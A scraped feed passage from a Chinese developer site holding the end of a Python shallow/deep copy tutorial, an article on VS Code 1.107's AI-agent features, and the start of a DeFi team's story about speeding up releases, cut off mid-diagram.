<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(a) == <span class="hljs-built_in">id</span>(b) == <span class="hljs-built_in">id</span>(c))  <span class="hljs-comment"># 输出：True</span>
</code></pre>
<h3 data-id="heading-13">2. 循环引用的处理</h3>
<p>深拷贝能自动处理循环引用（对象引用自身），而浅拷贝会保留循环引用，可能导致内存泄漏：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># 循环引用：列表引用自身</span>
lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]
lst.append(lst)

<span class="hljs-comment"># 深拷贝：正确处理循环引用</span>
deep_lst = copy.deepcopy(lst)
<span class="hljs-built_in">print</span>(deep_lst[-<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> deep_lst)  <span class="hljs-comment"># 输出：True（新的循环引用）</span>

<span class="hljs-comment"># 浅拷贝：保留原循环引用</span>
shallow_lst = copy.copy(lst)
<span class="hljs-built_in">print</span>(shallow_lst[-<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> lst)    <span class="hljs-comment"># 输出：True（引用原列表）</span>
</code></pre>
<h3 data-id="heading-14">3. 自定义对象的拷贝</h3>
<p>自定义类的实例默认使用浅拷贝，若需深拷贝，需重写 <code>__deepcopy__</code> 方法：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, hobbies</span>):
        self.name = name
        self.hobbies = hobbies  <span class="hljs-comment"># 可变对象（列表）</span>

<span class="hljs-comment"># 自定义对象的浅拷贝</span>
p1 = Person(<span class="hljs-string">"Alice"</span>, [<span class="hljs-string">"reading"</span>, <span class="hljs-string">"running"</span>])
p2 = copy.copy(p1)
p2.hobbies.append(<span class="hljs-string">"swimming"</span>)
<span class="hljs-built_in">print</span>(p1.hobbies)  <span class="hljs-comment"># ['reading', 'running', 'swimming']（被修改）</span>

<span class="hljs-comment"># 自定义对象的深拷贝</span>
p3 = copy.deepcopy(p1)
p3.hobbies.append(<span class="hljs-string">"cooking"</span>)
<span class="hljs-built_in">print</span>(p1.hobbies)  <span class="hljs-comment"># ['reading', 'running', 'swimming']（不受影响）</span>
</code></pre>
<h2 data-id="heading-15">总结</h2>
<ol>
<li>Python 中变量存储的是对象引用，赋值仅传递引用，不会创建新对象；</li>
<li>浅拷贝（<code>copy.copy()</code>）创建新的表层对象，深层元素仍共享引用，适用于单层可变对象；</li>
<li>深拷贝（<code>copy.deepcopy()</code>）递归复制所有层级元素，新对象与原对象完全隔离，适用于嵌套可变对象；</li>
<li>不可变对象的深浅拷贝等同于赋值，深拷贝可处理循环引用，是数据完全隔离的首选方式</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VS Code 1.107 发布：AI 不再是插件，而是编辑器的「第一大脑」]]></title>    <link>https://juejin.cn/post/7589835342146125834</link>    <guid>https://juejin.cn/post/7589835342146125834</guid>    <pubDate>2026-01-01T00:54:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589835342146125834" data-draft-id="7582783931164311587" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VS Code 1.107 发布：AI 不再是插件，而是编辑器的「第一大脑」"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-01T00:54:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golang学习记"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VS Code 1.107 发布：AI 不再是插件，而是编辑器的「第一大脑」
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golang学习记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T00:54:09.000Z" title="Thu Jan 01 2026 00:54:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">🚀 一句话总结</h2>
<blockquote>
<p><strong>VS Code 1.107 彻底重构了 AI 交互模型：从「问一句答一句」的 Chat 界面，升级为「预测式协作者」——它提前 3 步猜你想写什么，并在你敲下回车前，把代码、文档、测试全铺好。</strong></p>
</blockquote>
<p><strong>你的 IDE，终于学会「主动干活」了。</strong></p>
<hr/>
<h2 data-id="heading-1">🖼️整合代理会话和聊天</h2>
<p>新版本将代理会话集成到了聊天视图中，为您在使用代理时提供统一的体验。您可以一目了然地查看会话的状态、进度以及文件更改统计信息。您还可以对会话进行归档或取消归档，以便保持会话列表的整洁有序
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86a9e40f60e64993827b754e8a8af8cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=B0JpwXWMkbpoBGDxcFXYB%2Bx5FtE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>当你从列表中选中一个会话时，它会在侧边栏的聊天视图中打开该会话，方便您查看完整的对话历史记录。如果您愿意，也可以选择将某个会话作为编辑器标签页或在新窗口中打开。右键点击会话即可看到包含这些选项的上下文菜单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d459d7e16134ebd8e9b774a86fbf479~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=Pa%2FiUvUdCL1InebqY2az%2BoEktns%3D" alt="在这里插入图片描述" loading="lazy"/>
默认情况下，再聊天窗口会显示最近的3个会话
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e96e048d456405fb778b2bcca72d274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=%2BzpRZSGz6e2gAajS2lO6PU7481w%3D" alt="在这里插入图片描述" loading="lazy"/>
选择“Show All Sessions”即可查看完整的会话列表，并提供搜索与筛选选项。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b6ec63262642fd83389d2564db036e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=0deXDaa7fWWGeTLzR%2BzsQwc11mM%3D" alt="在这里插入图片描述" loading="lazy"/>
并排视图</p>
<p>当聊天视图足够宽时（例如，当您将其最大化时），会话列表会自动以并排方式与聊天视图一起显示。这种视图让您可以在不丢失上下文的情况下快速在不同会话之间切换。您也可以使用相应的控制按钮手动切换这种并排视图。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df5765a1de4a40618df19434f9540aaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=Y7k10Gj5ThFQdbmNmZTyLRNOgrk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">🔍 使用 Git 工作树隔离后台代理</h2>
<p>后台代理旨在后台自主运行，让您可以分流任务，从而专注于其他工作。如果多个后台代理同时修改工作区中的同一文件，可能会引发冲突。</p>
<p>在新版本中，我们通过引入对 Git 工作树的支持，增强了后台代理的隔离性。当您创建一个新的后台代理时，可以选择在当前工作区中运行，或在专用的 Git 工作树中运行。让后台任务的执行更安全。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/202bed9a1aa04f87b58151554d1f24a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=8rSDFFE%2B22ZzxhhUvg6fzxOh5p0%3D" alt="在这里插入图片描述" loading="lazy"/>
当你在 Git 工作树中运行后台代理时，代理会为该会话自动创建一个新的 Git 工作树，将其变更隔离到单独的文件夹中。这样，您就可以同时运行多个后台代理而不会产生冲突。</p>
<p>在后台代理完成任务后，您可以轻松地将工作树中所做的变更审查并合并回主工作区。我们还新增了一个操作，可直接将工作树中的变更应用到您的工作区。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8edf7b398a084e1790823453a14233cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=9pMNWC7CGS1u9%2Bin1u2aoO0SUoo%3D" alt="在这里插入图片描述" loading="lazy"/>
后台代理现在支持多种上下文附加类型。您可以将选区、问题、符号、搜索结果、Git 提交等内容附加到任意提示中。这使得构建更丰富、更精准的提示成为可能，从而解锁更复杂、更灵活的工作流。例如，您可以附加一个已报告的问题，并让代理直接修复它，而无需手动指定文件路径和行号。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bc651fb3ca441619f3606b1a6f6fc3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=jaxO%2FeXVjJ4Th2VXMkRg09feNLM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3">2️⃣ 🛠️内联聊天UI</h3>
<p>现在，内联聊天已针对当前文件内的代码修改进行了优化。对于内联聊天无法处理的任务，系统会自动升级到聊天视图（Chat view），您的提示会被重新播放，并使用相同的模型和相同的上下文。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/452b9bbdd3ba4f75960ed70df664124c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=bSEcinzlRnOgTjm7sDAfYsD9DgM%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13e0d13da7b44871a77fabf3fadc5782~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=K6uPOcwIMoHvhTXUlCsYBCLMgik%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">3️⃣ 🧪 一键允许终端所有命令</h3>
<p>终端工具新增了自动批准选项，可允许会话中所有未来的命令无需逐一确认。当您开启新会话时，终端命令仍会遵循现有的批准配置。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0a3f9ebc83645febebf539213c33a41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=pQrJ66EuKX1rcqL5VT9XWjWwVpE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">3️⃣ 🧪 自定义Agent可绑定快捷键</h3>
<p>每个自定义代理现在在命令列表中都有各自独立的操作项，您还可以为每个操作单独绑定键盘快捷键。例如，如果您定义了一个名为“Code Reviewer”的自定义代理，命令面板中就会出现 Chat: 打开聊天（Code Reviewer代理） 这一命令，供您为其绑定键盘快捷键。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a76e01ea2034b96b0ed5b59fc9096ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=%2BIAVCBaGfFiL5qmUYLtxh7zP%2FXg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">💭 最后说两句</h2>
<blockquote>
<p><em>“工具的终极目标，不是取代人，而是让人回归创造性本身。”</em></p>
</blockquote>
<p>VS Code 1.107 的 AI 不是魔法——<br/>
它是<strong>十年工程沉淀 + 对开发者工作流的深刻理解</strong>的结晶。</p>
<p>当补全不再打断心流，当错误变成教学时刻，当 PR Review 从负担变成对话——<br/>
<strong>我们离「编程即思考」的初心，又近了一步。</strong></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 3 小时到 15 分钟：我们的发布效率提升 10 倍之路]]></title>    <link>https://juejin.cn/post/7589940913766858787</link>    <guid>https://juejin.cn/post/7589940913766858787</guid>    <pubDate>2026-01-01T08:39:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913766858787" data-draft-id="7589930672833282083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 3 小时到 15 分钟：我们的发布效率提升 10 倍之路"/> <meta itemprop="keywords" content="自动化运维"/> <meta itemprop="datePublished" content="2026-01-01T08:39:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="draking"/> <meta itemprop="url" content="https://juejin.cn/user/1065861228790043"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 3 小时到 15 分钟：我们的发布效率提升 10 倍之路
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1065861228790043/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    draking
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:39:28.000Z" title="Thu Jan 01 2026 08:39:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>一个 DeFi 团队如何通过流程优化，把发布时间从半天压缩到一杯咖啡的时间</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">那个让我崩溃的周五下午</h2>
<p>故事要从三个月前说起。</p>
<p>那是一个周五下午，我们要发布质押系统的第一个版本。作为团队里唯一懂部署的人，我信心满满地开始了发布流程。</p>
<p><strong>14:00</strong> - 开始部署合约到 Polygon 测试网
<strong>14:30</strong> - 合约部署成功，开始更新前端配置
<strong>14:45</strong> - 发现配置文件格式写错了，重新修改
<strong>15:00</strong> - 前端打包完成，开始部署
<strong>15:20</strong> - 部署成功，但发现合约地址配错了
<strong>15:40</strong> - 重新打包，重新部署
<strong>16:00</strong> - 终于可以测试了，发现一个 bug
<strong>16:30</strong> - 修复 bug，重新走一遍流程...</p>
<p>到晚上 8 点，我们才完成发布。整整 <strong>6 个小时</strong>。</p>
<p>更糟糕的是，第二天发现生产环境的合约地址和测试环境混淆了，又花了 2 小时修复。</p>
<p>那一刻我意识到：<strong>这样下去不行。</strong></p>
<hr/>
<h2 data-id="heading-1">问题出在哪里</h2>
<p>我们复盘了整个流程，发现问题集中在几个地方：</p>
<h3 data-id="heading-2">1. 手动操作太多</h3>
<p>每次发布需要：</p>
<ul>
<li>手动执行 5+ 条命令</li>
<li>手动修改 3+ 个配置文件</li>
<li>手动复制粘贴合约地址</li>
<li>手动写发布文档</li>
<li>手动在群里通知</li>
</ul>
<p>任何一个环节出错，都要从头再来。</p>
<h3 data-id="heading-3">2. 没有验证机制</h3>
<p>改了配置不知道对不对，部署完不知道成不成功，全靠「感觉」和「肉眼检查」。</p>
<h3 data-id="heading-4">3. 知识在人脑里</h3>
<p>只有我知道完整的发布流程，其他人接手根本不知道该怎么做。</p>
<h3 data-id="heading-5">4. 缺乏文档化</h3>
<p>每次发布完，变更了什么、合约地址是什么，全靠聊天记录找。</p>
<hr/>
<h2 data-id="heading-6">我们做了什么</h2>
<p>接下来的两个月，我们一步步优化，最终把发布时间压缩到了 <strong>15 分钟</strong>。</p>
<h3 data-id="heading-7">第一步：梳理流程，画出流程图</h3>
<p>我们先把所有步骤写下来，画成流程图：</p>
<pre><code class="hljs">┌─────────────────────────────────────────────────────────────────┐
│                         发布流程 v1.0                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  代码提交 → 合约部署 → 配置更新 → 前端打包 → 部署发布 → 文档通知  │
│                                                                 │
│  耗时分布：                                                      │
│  ├── 合约部署：30 分钟（含等待确认）                              │
│  ├── 配置更新：15 分钟（手动修改 + 检查）                         │
│  ├── 前端打包：10 分钟                                           │
│  ├── 部署发布：20 分钟（含验证）                                  │
│  ├── 文档通知：30 分钟（手动编写）                                │
│  └── 意外处理：60+ 分钟（配置错误、环境问题等）                   │
│                                                                 │
│  总计：约 3 小时（顺利的话）                                      │
│                                                                 │
